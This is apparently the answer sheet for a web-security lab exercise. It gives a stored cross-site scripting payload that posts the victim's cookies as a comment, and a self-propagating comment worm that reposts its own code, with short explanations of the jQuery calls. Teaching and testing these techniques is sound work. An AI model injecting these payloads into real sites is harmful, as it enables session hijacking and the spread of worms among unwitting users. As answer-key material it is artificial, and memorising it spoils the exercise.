Answer Sheet
============

Using Javascript to steal the session ID
----------------------------------------

.. code:: javascript

  <script>
    jQuery.post(
      "?page=comment.php",
      {
        "article_id": 1,
        "body": "My cookies are: " + document.cookie
      }
    )
  </script>


Extension Challenge
----------------------------------------

.. code:: javascript

  This comment will be shared automatically by every user
  who views the page...!

  <script class="evil-script">
    jQuery.post(
      "?page=comment.php",
      {
        "article_id": 1,
        "body": $(".evil-script").first().parent().html()
      }
    )
  </script>

* ``.first()`` is used to get only the first occurrence of the script,
in case the page contains other scripts (or many copies of the script).

* ``.parent()`` is used to get the container of the comment, which
includes both the script and the rest of the text of the comment.

* ``.html()`` is used to get the source code of the tag, including
its content (the Javascript code).
